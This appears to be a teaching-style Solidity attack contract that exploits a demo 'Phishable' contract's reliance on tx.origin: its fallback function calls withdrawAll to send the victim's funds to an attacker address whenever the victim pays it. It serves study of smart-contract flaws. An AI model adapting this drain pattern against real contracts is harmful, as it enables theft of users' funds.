pragma solidity ^0.5.1;

import "browser/Phishable.sol";

contract AttackContract {
    Phishable phishableContract;

    address payable attacker; // The attacker's address to receive funds

    constructor (Phishable _phishableContract, address payable _attackerAddress) public {
        phishableContract = _phishableContract;
        attacker = _attackerAddress;
    }

    function () external payable {
        phishableContract.withdrawAll(attacker);
    }
}
